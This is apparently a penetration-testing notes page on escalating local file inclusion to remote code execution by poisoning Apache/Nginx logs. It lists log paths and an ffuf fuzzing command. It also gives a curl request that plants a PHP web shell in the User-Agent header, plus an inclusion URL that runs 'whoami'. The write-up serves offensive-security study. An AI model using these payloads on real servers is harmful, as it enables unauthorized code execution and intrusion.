---
Primary_category: "[[LFI]]"
title: "LFI TO RCE - LOG POISONING"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[LFI]]

#### *Theory*

An operator could chain an *LFI* with an *RCE* is the system user running the web application has read permissions on web log files

The most commonly used web servers are *Apache* and *Nginx*. The default paths for their log files are the following

##### *Linux*

###### *Standard*

```bash
/var/log/apache2/
/var/log/nginx/
```

###### *Plesk*

```bash
/var/www/vhosts/<DOMAIN.TLD>/logs/
/var/www/vhosts/system/<DOMAIN.TLD>/logs/
```

##### *Windows*

```bash
C:\xamp\apache\logs\
C:\nginx\log\
```

This technique is not limited to logs files related to web servers, we can apply the same principles we are going to see to the following log files

```bash
/var/log/sshd.log
/var/log/maillog # /var/log/mail
/var/log/vsftpd.log
```

---

#### *Abuse*

Both *apache* and *nginx* access logs reflect the *User Agent* of incoming *HTTP* requests

So, if an operator sends an *HTTP* requests whose *User Agent* value is a *web shell* and the vulnerable function to *LFI* evaluates the content in addition to including it, he can point to a web log file for which the user running the application has read permissions

So, the steps would be as follows

##### *Check which log files we have read permissions for*

We can leverage the *LFI* in order to check which files we have read permissions for. If the content of the specified log file is listed, it means that we have it

```bash
?language=/var/log/apache2/access_ssl_log
```

If we get nothing trying to include the standard path for known log files such as *access_log* or *error.log*, we should start with *[[FUZZING|Fuzzing]]*

###### *Fuzzing*

> ***[LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)***

```bash
ffuf -t 200 -v -w /usr/share/seclist/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http[s]://<TARGET>:<PORT>/index.php?language=FUZZ' -fs <INT> | grep -iP --color -- '/var/log'
```

##### *Sending the malicious User-Agent*

Once we locate a file that we can read and that reflects the *User-Agent*, such as the *Apache's access_ssl_log*, we can send an *HTTP* request to the server with a *User-Agent* header containing *PHP* code

```bash
echo -n 'User-Agent: <?php system($_GET[0]); ?>' > header
curl --silent --location --request GET "https://www.domain.tld/index.php" --header @header
```

##### *RCE*

Then, we can include the *log file* for which we have read permission through the *Local File Inclusion* and we will get *Remote Code Execution* as the *PHP* code stored in the *User-Agent* field of the log file will be evaluated

```bash
?language=/var/log/apache2/access_ssl_log&0=whoami
```